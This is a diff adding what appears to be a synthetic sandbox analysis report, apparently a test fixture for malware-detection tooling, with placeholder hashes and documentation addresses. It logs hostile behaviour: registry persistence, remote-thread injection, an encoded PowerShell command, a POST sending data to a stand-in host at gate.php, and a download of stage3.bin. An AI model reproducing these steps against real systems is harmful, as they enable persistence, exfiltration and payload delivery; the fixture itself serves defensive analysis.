@@ -1,0 +1,381 @@
+{
+  "info": {
+    "id": 2,
+    "started": "2024-01-15 11:00:00",
+    "ended": "2024-01-15 11:03:45",
+    "duration": 225,
+    "machine": {
+      "name": "Strazh-Win10",
+      "label": "Strazh-Win10",
+      "manager": "VirtualBox"
+    }
+  },
+  "target": {
+    "file": {
+      "name": "suspicious_sample.exe",
+      "size": 78848,
+      "type": "PE32 executable (GUI) Intel 80386",
+      "sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
+    }
+  },
+  "behavior": {
+    "processes": [
+      {
+        "pid": 3100,
+        "ppid": 1044,
+        "process_name": "suspicious_sample.exe",
+        "module_path": "C:\\Users\\user\\Desktop\\suspicious_sample.exe",
+        "first_seen": "2024-01-15 11:00:01.100",
+        "calls": [
+          {
+            "timestamp": "2024-01-15 11:00:01.200",
+            "category": "system",
+            "api": "LdrLoadDll",
+            "arguments": {
+              "module_name": "kernel32.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:01.250",
+            "category": "system",
+            "api": "LdrLoadDll",
+            "arguments": {
+              "module_name": "advapi32.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:01.400",
+            "category": "file",
+            "api": "NtCreateFile",
+            "arguments": {
+              "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:01.500",
+            "category": "file",
+            "api": "NtWriteFile",
+            "arguments": {
+              "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:01.600",
+            "category": "registry",
+            "api": "RegSetValueExW",
+            "arguments": {
+              "regkey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+              "value": "SystemHelper",
+              "data": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:01.700",
+            "category": "process",
+            "api": "CreateProcessInternalW",
+            "arguments": {
+              "filepath": "C:\\Windows\\System32\\cmd.exe",
+              "command_line": "cmd.exe /c whoami"
+            },
+            "return_value": "1",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:02.000",
+            "category": "process",
+            "api": "NtAllocateVirtualMemory",
+            "arguments": {
+              "process_handle": "0xffffffff",
+              "regionsize": "0x1000",
+              "protection": "0x40"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:02.100",
+            "category": "process",
+            "api": "NtWriteVirtualMemory",
+            "arguments": {
+              "process_handle": "0x00000084",
+              "buffer_length": 4096
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:02.200",
+            "category": "process",
+            "api": "CreateRemoteThread",
+            "arguments": {
+              "process_handle": "0x00000084",
+              "start_address": "0x00400000"
+            },
+            "return_value": "0x00000088",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:02.500",
+            "category": "network",
+            "api": "InternetOpenUrlA",
+            "arguments": {
+              "url": "http://203.0.113.50/gate.php"
+            },
+            "return_value": "0x00cc0001",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:02.800",
+            "category": "network",
+            "api": "HttpSendRequestA",
+            "arguments": {
+              "url": "http://203.0.113.50/gate.php",
+              "post_data": "id=STRAZH01&data=encoded_payload"
+            },
+            "return_value": "1",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:03.000",
+            "category": "file",
+            "api": "NtCreateFile",
+            "arguments": {
+              "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\payload_stage2.bin"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:03.100",
+            "category": "file",
+            "api": "NtWriteFile",
+            "arguments": {
+              "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\payload_stage2.bin"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:03.300",
+            "category": "registry",
+            "api": "RegSetValueExW",
+            "arguments": {
+              "regkey": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\malhelper",
+              "value": "ImagePath",
+              "data": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:03.500",
+            "category": "process",
+            "api": "CreateProcessInternalW",
+            "arguments": {
+              "filepath": "C:\\Windows\\System32\\cmd.exe",
+              "command_line": "cmd.exe /c powershell -enc dABlAHMAdAA="
+            },
+            "return_value": "1",
+            "status": true
+          }
+        ]
+      },
+      {
+        "pid": 3200,
+        "ppid": 3100,
+        "process_name": "cmd.exe",
+        "module_path": "C:\\Windows\\System32\\cmd.exe",
+        "first_seen": "2024-01-15 11:00:01.750",
+        "calls": [
+          {
+            "timestamp": "2024-01-15 11:00:01.800",
+            "category": "process",
+            "api": "CreateProcessInternalW",
+            "arguments": {
+              "filepath": "C:\\Windows\\System32\\whoami.exe",
+              "command_line": "whoami"
+            },
+            "return_value": "1",
+            "status": true
+          }
+        ]
+      },
+      {
+        "pid": 3300,
+        "ppid": 3200,
+        "process_name": "whoami.exe",
+        "module_path": "C:\\Windows\\System32\\whoami.exe",
+        "first_seen": "2024-01-15 11:00:01.850",
+        "calls": [
+          {
+            "timestamp": "2024-01-15 11:00:01.900",
+            "category": "system",
+            "api": "LdrLoadDll",
+            "arguments": {
+              "module_name": "ntdll.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          }
+        ]
+      },
+      {
+        "pid": 3400,
+        "ppid": 3100,
+        "process_name": "cmd.exe",
+        "module_path": "C:\\Windows\\System32\\cmd.exe",
+        "first_seen": "2024-01-15 11:00:03.550",
+        "calls": [
+          {
+            "timestamp": "2024-01-15 11:00:03.600",
+            "category": "process",
+            "api": "CreateProcessInternalW",
+            "arguments": {
+              "filepath": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "command_line": "powershell -enc dABlAHMAdAA="
+            },
+            "return_value": "1",
+            "status": true
+          }
+        ]
+      },
+      {
+        "pid": 3500,
+        "ppid": 3400,
+        "process_name": "powershell.exe",
+        "module_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "first_seen": "2024-01-15 11:00:03.650",
+        "calls": [
+          {
+            "timestamp": "2024-01-15 11:00:03.700",
+            "category": "system",
+            "api": "LdrLoadDll",
+            "arguments": {
+              "module_name": "amsi.dll"
+            },
+            "return_value": "0x00000000",
+            "status": true
+          },
+          {
+            "timestamp": "2024-01-15 11:00:03.800",
+            "category": "network",
+            "api": "InternetOpenUrlA",
+            "arguments": {
+              "url": "http://203.0.113.50/stage3.bin"
+            },
+            "return_value": "0x00cc0002",
+            "status": true
+          }
+        ]
+      }
+    ],
+    "processtree": [
+      {
+        "pid": 3100,
+        "name": "suspicious_sample.exe",
+        "children": [
+          {
+            "pid": 3200,
+            "name": "cmd.exe",
+            "children": [
+              {
+                "pid": 3300,
+                "name": "whoami.exe",
+                "children": []
+              }
+            ]
+          },
+          {
+            "pid": 3400,
+            "name": "cmd.exe",
+            "children": [
+              {
+                "pid": 3500,
+                "name": "powershell.exe",
+                "children": []
+              }
+            ]
+          }
+        ]
+      }
+    ],
+    "summary": {
+      "files": [
+        "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll",
+        "C:\\Users\\user\\AppData\\Local\\Temp\\payload_stage2.bin"
+      ],
+      "read_files": [],
+      "write_files": [
+        "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll",
+        "C:\\Users\\user\\AppData\\Local\\Temp\\payload_stage2.bin"
+      ],
+      "delete_files": [],
+      "registry_read": [],
+      "registry_write": [
+        "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\malhelper"
+      ],
+      "mutexes": ["Global\\SvcHelperMutex"]
+    }
+  },
+  "network": {
+    "dns": [
+      {
+        "request": "evil.example.com",
+        "type": "A",
+        "answers": [{"type": "A", "data": "203.0.113.50"}]
+      }
+    ],
+    "http": [
+      {
+        "uri": "http://203.0.113.50/gate.php",
+        "method": "POST",
+        "body": "id=STRAZH01&data=encoded_payload",
+        "user-agent": "Mozilla/4.0"
+      },
+      {
+        "uri": "http://203.0.113.50/stage3.bin",
+        "method": "GET",
+        "body": "",
+        "user-agent": "Mozilla/4.0"
+      }
+    ],
+    "tcp": [
+      {"src": "192.168.56.101", "sport": 49152, "dst": "203.0.113.50", "dport": 80}
+    ],
+    "udp": [
+      {"src": "192.168.56.101", "sport": 55123, "dst": "8.8.8.8", "dport": 53}
+    ]
+  },
+  "dropped": [
+    {
+      "name": "svchost_helper.dll",
+      "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\svchost_helper.dll",
+      "size": 45056,
+      "sha256": "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3",
+      "type": "PE32 executable (DLL) Intel 80386"
+    },
+    {
+      "name": "payload_stage2.bin",
+      "filepath": "C:\\Users\\user\\AppData\\Local\\Temp\\payload_stage2.bin",
+      "size": 12288,
+      "sha256": "c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4",
+      "type": "data"
+    }
+  ],
+  "signatures": [
+    {"name": "persistence_autorun", "severity": 3, "description": "Creates an autorun registry key"},
+    {"name": "injection_createremotethread", "severity": 3, "description": "Injects code into another process via CreateRemoteThread"},
+    {"name": "network_http", "severity": 2, "description": "Makes HTTP requests"}
+  ]
+}
